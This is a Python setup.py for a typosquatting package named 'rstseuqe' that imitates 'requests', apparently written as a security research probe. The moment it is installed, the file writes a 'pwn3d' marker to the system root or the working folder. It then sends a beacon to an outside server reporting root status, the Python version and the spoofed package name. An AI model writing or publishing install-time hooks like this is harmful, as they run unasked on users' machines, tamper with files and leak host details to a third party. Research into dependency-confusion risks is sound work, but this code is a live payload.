from setuptools import setup
import sys


try:
  with open('/pwn3d.txt', 'w+') as f:
    f.write("You are (fully) pwn3d due to a homobraphic error on your software dependencies")
  is_sudo = True
except:
  try:
    with open('pwn3d.txt', 'w+') as f:
      f.write("You are (slightly) pwn3d due to a homobraphic error on your software dependencies")
  except:
    pass
  is_sudo = False


def telemetry(is_sudo, sender, original_name, new_name):
  url = "http://homografo.junquera.xyz:9999"

  try:
      # python2
      from urllib import urlencode as encoder
      from urllib2 import urlopen as request
      encode = lambda x: x.encode()
  except:
      # python3
      from urllib.parse import urlencode as encoder
      from urllib.request import urlopen as request
      import codecs
      encode = codecs.encode

  data = encoder(dict(
      is_sudo=is_sudo,
      sender=sender,
      original_name=original_name,
      new_name=new_name,
      version=sys.version
  ))

  request(url, encode(data), timeout=0.1)

try:
    telemetry(is_sudo, "pypi", "requests", "rstseuqe")
except:
    pass

setup(
    name="rstseuqe",
    version = "1000.0.0",
    url="https://junquera.xyz",
    description="A bad copy of requests for testing homographic vulnerabilities.",
    long_description="# NEVER USE THIS DEPENDENCY\nIt's a security test",
    long_description_content_type='text/markdown',
    author="homografo",
    author_email="homografo@junquera.xyz",
    packages=["rstseuqe"],
    license="MIT License",
    install_requires=["requests"]
)
